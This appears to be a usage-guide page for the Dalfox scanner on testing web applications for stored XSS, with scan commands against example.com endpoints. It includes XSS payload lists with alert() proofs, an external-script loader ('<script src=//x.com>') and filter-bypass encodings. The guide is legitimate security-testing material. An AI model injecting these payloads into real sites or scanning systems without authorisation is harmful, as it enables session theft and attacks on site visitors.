+++
title = "Stored XSS Testing"
description = "Learn how to test for stored (persistent) XSS vulnerabilities"
weight = 4
sort_by = "weight"

[extra]
+++

Stored XSS (also called Persistent XSS) occurs when malicious input is saved by the application and later displayed to users without proper sanitization.

## What is Stored XSS?

Stored XSS vulnerabilities happen when:

1. User submits malicious input (e.g., comment, profile update)
2. Application stores the input in a database
3. Application retrieves and displays the input to other users
4. Malicious script executes in victims' browsers

{% alert_warning() %}
Stored XSS is generally more dangerous than reflected XSS because it affects multiple users and persists over time.
{% end %}

## Dalfox SXSS Mode

Dalfox provides a dedicated stored XSS (SXSS) testing mode that:

1. Submits payloads to the injection endpoint
2. Checks a separate verification URL for payload reflection
3. Detects if the payload persists and executes

## Basic Stored XSS Testing

### Simple Example

```bash
dalfox scan https://example.com/comment/submit \
  --sxss \
  --sxss-url https://example.com/comment/view?id=1 \
  --sxss-method GET
```

**How it works:**
1. Dalfox injects payloads at `/comment/submit`
2. Then checks `/comment/view?id=1` for payload execution
3. Reports findings if payloads are found and verified

### With POST Data

```bash
dalfox scan https://example.com/api/comment \
  -X POST \
  -d "comment=test&author=user&post_id=123" \
  --sxss \
  --sxss-url https://example.com/post/123 \
  --sxss-method GET \
  -p comment -p author
```

## Common Stored XSS Scenarios

### Scenario 1: Blog Comments

**Submission endpoint:**
```bash
dalfox scan https://blog.example.com/comment/add \
  -X POST \
  -d "name=John&email=john@example.com&comment=Great post!" \
  --sxss \
  --sxss-url https://blog.example.com/post/my-first-post \
  -p name -p comment
```

### Scenario 2: User Profile

**Update profile, verify on profile page:**
```bash
dalfox scan https://example.com/api/profile \
  -X PUT \
  -H "Authorization: Bearer token123" \
  -H "Content-Type: application/json" \
  -d '{"displayName":"John","bio":"Developer","location":"SF"}' \
  --sxss \
  --sxss-url https://example.com/user/john \
  -p displayName -p bio -p location
```

### Scenario 3: Product Review

```bash
dalfox scan https://shop.example.com/review/submit \
  -X POST \
  -d "product_id=42&rating=5&review=Excellent product&reviewer=John" \
  --sxss \
  --sxss-url https://shop.example.com/product/42 \
  -p review -p reviewer
```

### Scenario 4: Forum Post

```bash
dalfox scan https://forum.example.com/topic/create \
  -X POST \
  -H "Cookie: session=abc123" \
  -d "title=New Topic&content=Discussion content&category=general" \
  --sxss \
  --sxss-url https://forum.example.com/topic/latest \
  -p title -p content
```

## Advanced SXSS Testing

### Authenticated Testing

```bash
dalfox scan https://example.com/api/comment \
  -X POST \
  -H "Authorization: Bearer eyJhbGci..." \
  -H "Content-Type: application/json" \
  -d '{"text":"comment","post_id":123}' \
  --sxss \
  --sxss-url https://example.com/api/post/123 \
  --sxss-method GET \
  -p text \
  --cookies "session=abc123" \
  -f json \
  -o sxss-results.json
```

### Custom Payloads for Stored XSS

Create payloads optimized for stored contexts:

**stored-payloads.txt:**
```html
<script>alert('Stored XSS')</script>
<img src=x onerror=alert('Stored')>
<svg onload=alert('Stored')>
"><script>alert(document.domain)</script>
'><script>alert(1)</script>
<iframe src="javascript:alert('Stored')">
<body onload=alert('Stored')>
```

```bash
dalfox scan https://example.com/comment \
  -X POST \
  -d "comment=test" \
  --sxss \
  --sxss-url https://example.com/comments \
  --custom-payload stored-payloads.txt \
  -p comment
```

### Multiple Verification URLs

Test one injection point but verify on multiple pages:

```bash
# Submit to comment endpoint
dalfox scan https://example.com/comment/add \
  -X POST \
  -d "comment=test&post_id=1" \
  --sxss \
  --sxss-url https://example.com/post/1 \
  -p comment

# Manually verify on other pages:
# - Recent comments: https://example.com/recent
# - User profile: https://example.com/user/me
# - Admin dashboard: https://example.com/admin/comments
```

## Real-World Testing Workflow

### Step 1: Identify Storage Points

Find endpoints that accept and store user input:
- Comment forms
- Profile updates
- Message/chat systems
- File upload metadata
- Review/rating systems
- Any data shown to other users

### Step 2: Map Data Flow

Understand where stored data appears:
1. Submit test data (unique string like "XSS_TEST_12345")
2. Search application for where it appears
3. Note all URLs displaying the data

### Step 3: Test with Dalfox SXSS

For each storage point:

```bash
#!/bin/bash

# Example: Testing a blog comment system

SUBMIT_URL="https://blog.example.com/api/comment"
VERIFY_URL="https://blog.example.com/post/123"

dalfox scan "$SUBMIT_URL" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"post_id":123,"text":"test","author":"testuser"}' \
  --sxss \
  --sxss-url "$VERIFY_URL" \
  --sxss-method GET \
  -p text -p author \
  --remote-payloads portswigger \
  -e url,html \
  -f json \
  -o "sxss-blog-comment-$(date +%Y%m%d).json"
```

### Step 4: Verify and Document

1. Check Dalfox output for found vulnerabilities
2. Manually verify each finding in a browser
3. Document:
   - Injection endpoint
   - Verification URL(s)
   - Successful payload
   - Impact (who can view the stored XSS)

## Testing Tips

{% collapse(title="1. Consider Persistence") %}
Stored XSS payloads might persist in the database indefinitely. After testing:
- Delete test data if possible
- Use clear test markers (e.g., `TEST_XSS_2024`)
- Document what you stored for cleanup
{% end %}

{% collapse(title="2. Test Different Contexts") %}
Stored data might appear in multiple contexts:
```bash
# Submit once, verify everywhere
dalfox scan https://example.com/profile/update \
  -d "bio=test" \
  --sxss \
  --sxss-url https://example.com/user/me

# Also manually check:
# - Search results
# - User lists
# - Admin panels
# - Email notifications
# - API responses
```
{% end %}

{% collapse(title="3. Consider Timing") %}
Stored XSS might not appear immediately:
- Moderation queues
- Cache invalidation delays
- Async processing

Wait and re-check verification URLs after some time.
{% end %}

{% collapse(title="4. Test Modification") %}
Test if you can modify existing stored data:
```bash
# Update existing comment
dalfox scan https://example.com/comment/123/edit \
  -X PUT \
  -d "comment=updated text" \
  --sxss \
  --sxss-url https://example.com/post/456
```
{% end %}

## Combining with Parameter Mining

Find hidden parameters that might store data:

```bash
dalfox scan https://example.com/api/comment \
  -X POST \
  -d "text=test&post_id=1" \
  --sxss \
  --sxss-url https://example.com/post/1 \
  -W params.txt \
  --remote-wordlists burp,assetnote \
  --remote-payloads portswigger,payloadbox \
  -f json \
  -o comprehensive-sxss.json
```

## Common Injection Points

### High-Value Stored XSS Targets

1. **User-Generated Content**
   - Comments
   - Forum posts
   - Reviews
   - Chat messages

2. **Profile Fields**
   - Display name
   - Bio/About
   - Status messages
   - Website URL

3. **Metadata**
   - Document titles
   - File descriptions
   - Image captions
   - Tags/labels

4. **Administrative Data**
   - System messages
   - Notifications
   - Alerts
   - Logs (if displayed)

## Payload Optimization

### Short Payloads

For length-restricted fields:

```html
<script src=//x.com>
<svg onload=alert(1)>
<img src onerror=alert(1)>
```

### Encoded Payloads

Bypass input filters:

```bash
dalfox scan https://example.com/comment \
  -X POST \
  -d "text=test" \
  --sxss \
  --sxss-url https://example.com/comments \
  -e url,html,base64 \
  -p text
```

### Context-Aware Payloads

Different contexts need different payloads:

**HTML Context:**
```html
<script>alert(1)</script>
```

**Attribute Context:**
```html
" onload="alert(1)
```

**JavaScript Context:**
```javascript
'-alert(1)-'
```

## Manual Verification

Always manually verify stored XSS findings:

1. **Submit payload** using Dalfox
2. **Open verification URL** in browser
3. **Check for execution**:
   - Alert boxes
   - Console errors
   - Network requests
   - DOM changes
4. **Test different browsers** (Chrome, Firefox, Safari)
5. **Test different users** (victim accounts)

## Impact Assessment

Stored XSS impact depends on:

1. **Who can view?**
   - Public (highest impact)
   - Authenticated users
   - Admins only

2. **What can attacker do?**
   - Steal session cookies
   - Modify page content
   - Redirect users
   - Keylog credentials
   - Perform actions as victim

3. **How persistent?**
   - Permanent
   - Until moderator removes
   - Session-based

## Example: Complete SXSS Test

```bash
#!/bin/bash

# Configuration
TARGET_SUBMIT="https://example.com/api/comment"
TARGET_VERIFY="https://example.com/post/123"
AUTH_TOKEN="eyJhbGci..."

# Run comprehensive stored XSS test
dalfox scan "$TARGET_SUBMIT" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -d '{"post_id":123,"comment":"test comment","author":"testuser"}' \
  --sxss \
  --sxss-url "$TARGET_VERIFY" \
  --sxss-method GET \
  -p comment -p author \
  --custom-payload stored-xss-payloads.txt \
  --remote-payloads portswigger,payloadbox \
  -e url,html,base64 \
  --timeout 30 \
  --delay 500 \
  -f json \
  --include-request \
  --include-response \
  -o "sxss-report-$(date +%Y%m%d-%H%M%S).json"

# Check results
if [ -f "sxss-report-"*".json" ]; then
  echo "Testing complete. Checking for vulnerabilities..."
  VULN_COUNT=$(jq 'length' sxss-report-*.json | tail -1)
  
  if [ "$VULN_COUNT" -gt 0 ]; then
    echo "⚠️  Found $VULN_COUNT stored XSS vulnerabilities!"
    jq '.' sxss-report-*.json | tail -1
  else
    echo "✓ No stored XSS vulnerabilities detected"
  fi
fi
```

## See Also

- [Basic XSS Scanning](/usage_guides/basic_xss_scanning) - Standard XSS testing
- [Blind XSS Testing](/usage_guides/blind_xss_testing) - Out-of-band XSS
- [Scan Command](/sub-commands/scan) - Complete command reference
- [Custom Payloads](/usage_guides/custom_payloads) - Payload customization
